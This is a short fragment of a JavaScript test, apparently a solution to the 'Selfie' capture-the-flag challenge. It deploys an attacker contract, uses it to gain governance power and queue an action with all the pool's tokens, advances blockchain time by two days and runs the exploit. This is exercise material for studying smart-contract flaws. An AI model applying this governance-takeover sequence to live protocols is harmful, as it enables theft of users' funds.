...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        this.selfieAttacker = await SelfieAttackerFactory.deploy(this.token.address);
        await this.selfieAttacker.getGovernanceAndQueueAction(this.pool.address, this.governance.address, TOKENS_IN_POOL) 
        //Wait for proposal to be executable
        await ethers.provider.send('evm_increaseTime', [(2*24*60*60)]);
        await this.selfieAttacker.exploit();
    });
